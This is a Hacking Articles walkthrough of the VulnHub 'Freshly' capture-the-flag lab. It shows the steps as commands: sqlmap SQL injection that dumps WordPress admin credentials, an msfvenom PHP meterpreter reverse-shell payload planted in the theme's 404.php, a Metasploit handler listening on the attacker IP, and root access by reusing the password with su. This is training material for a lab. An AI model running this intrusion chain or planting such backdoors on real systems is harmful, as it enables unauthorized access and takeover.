<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Freshly VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-freshly-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-12-08T16:23:07+00:00">December 8, 2016</time><time class="updated" datetime="2025-06-10T20:30:22+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Here we come with a new article which will all be about a penetration testing challenge called FRESHLY. The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. It’s an easy lab. let’s get started with it and access it.</span></p>
<p><span style="color: #000000;">Download from here :</span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.vulnhub.com/?q=fresh&amp;sort=date-asc&amp;type=vm"><strong>https://www.vulnhub.com/?q=fresh&amp;sort=date-asc&amp;type=vm</strong></a></span></p>
<h3><span style="color: #800000;"><strong>Breaching Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
<li><span style="color: #000000;">Recon (Nikto)</span></li>
<li><span style="color: #000000;">Login Form Based SQL Injection</span></li>
<li><span style="color: #000000;">Abusing WordPress</span></li>
<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
<li><span style="color: #000000;">Take root access</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Start!!</strong></span></p>
<p><span style="color: #000000;">So to start with it firstly we have to find out the IP of FRESHLY. For that type the <strong>netdiscover </strong>command in the terminal of Kali. It will show each IP present in our network.</span></p>
<p><span style="color: #000000;">Now we have target IP:<strong> 192.168.1.112</strong> so let’s scan it with aggressive scan (-A).</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.112</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HpHHSLlbFLI/WuLgY5xVFaI/AAAAAAAAWh0/F3o48MKNDjQ4zAdKxhFLVR1B6IcmgSDTwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">This shows all open ports: <strong>80, 8080, 443</strong>.</span></p>
<p><span style="color: #000000;">As we can see 80 port is open so we will open target IP in our browser to find out what’s in there as our next clue.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uzT4DUdV2es/WuLgZpagNnI/AAAAAAAAWiE/JC0YmdMTYo8xkB8CMeij2lJA-HhBs6vUACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Next, we will apply the Nikto command to it. Nitko command will help us to gather information like its files and all the other major stuff that we ought to know about our target. So, therefore, type: Nikto -h [host URL].</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ngl3vfk0oxQ/WuLgZrOP7RI/AAAAAAAAWiA/ZQPLuauDWXY1MAoM4qo9W4BHy86ZE9PoQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">After scanning it shows that there is a <strong>login.php</strong> page found. So open it in a browser with target IP</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Pp2QOezdIPE/WuLgaIZ__fI/AAAAAAAAWiI/yJzJfl5CjmwPp8e2MZy4hx1nGWtMd7QXgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Since we don’t know the exact username and password, therefore, we have used SQLMAP for login form based injection for retrieving the database name and login credential by executing the following command.</span></p>
<pre class="lang:default decode:true">sqlmap -u 'http://192.168.1.112/login.php' --forms --risk=3 --level=5 --dbs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PnsfHFz4s2M/WuLgaVhewcI/AAAAAAAAWiM/UQ3QfvGKTzYD4RyMnLuMcgU1hXdQzdbwACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">From the sqlmap result, we came to that the name of the database could be“wordpress8080”, so now using sqlmap again fetch username and password from that database i.e. WordPress 8080</span></p>
<pre class="lang:default decode:true">sqlmap -u 'http://192.168.1.112/login.php' --forms -D wordpress8080 --risk=3 --level=3 --dump-all</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RVb90BIYFTA/WuLgac4dAzI/AAAAAAAAWiQ/aLGm7MHwhUIDDxA_RxTx5D45iqeYrgPBQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Alright, we have achieved our first step by finding out user and password for WordPress.</span></p>
<pre class="lang:default decode:true">User = admin
Password = SuperSecretPassword</pre>
<p><span style="color: #000000;">Earlier we have already found out our open ports so use one of not used ports to open in browser ie.8080</span></p>
<p><span style="color: #000000;">Cool…See what you have got…. Now click on this link and you are all set for the further result.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-grbwtBvpieg/WuLgav4KG-I/AAAAAAAAWiU/Aqy2J4-hogoBlF_iJlY4dtcF8JTyiKRKgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Candy goodness!!!!!  It’s our WordPress page. So let’s get on to other steps by opening a WordPress login page and entering the credentials we found out i.e.</span></p>
<pre class="lang:default decode:true">User= admin
Password= SuperSecretPassword</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9qUVg39I8So/WuLga1sjbvI/AAAAAAAAWiY/IjMwcgcSwbQL2RA0Icn63TNreI8SCntJgCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once you have logged in, make the malicious file that you got to upload in it. Generate code through <strong>the msfvenom</strong> command:</span></p>
<pre class="lang:default decode:true ">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.132 lport=4444 -f raw</pre>
<p><span style="color: #000000;">Side by side in other terminal open Metasploit and run multi handler.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-oCZwD-vz2SM/WuLgbI5-IcI/AAAAAAAAWic/5_a7wbXOJ9soeA2HNwCDRixbS0ANcF-VQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">From generated php raw file copy the code from <strong>&lt;?php</strong> to <strong>die()</strong>. As we want to read a file on the system, let’s put some PHP code in the theme: We go <strong>to Appearance -&gt; themes -&gt; 404.php</strong> and add some PHP code in order to execute it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-yUBsEpu91jY/WuLgZVkJuJI/AAAAAAAAWh8/R5m6-VgQxB8MrSAfCcsThCNwGV6YgDKgQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
<pre class="lang:default decode:true">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 192.168.1.132
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">From given below image you can observe <strong>Meterpreter session1</strong>, now start penetrating for accessing root privilege. Then to access proper TTY shell we had import python one line script by typing following:</span></p>
<pre class="lang:default decode:true ">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">To get root access account credential reuse from the WordPress admin password <strong>SuperSecretPassword </strong>that allowed su – to escalate privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FIs5Yk2qpxI/WuLgYyLiinI/AAAAAAAAWh4/iUoOvLC8AV8AseYST4wn8-pLliTS50AvwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
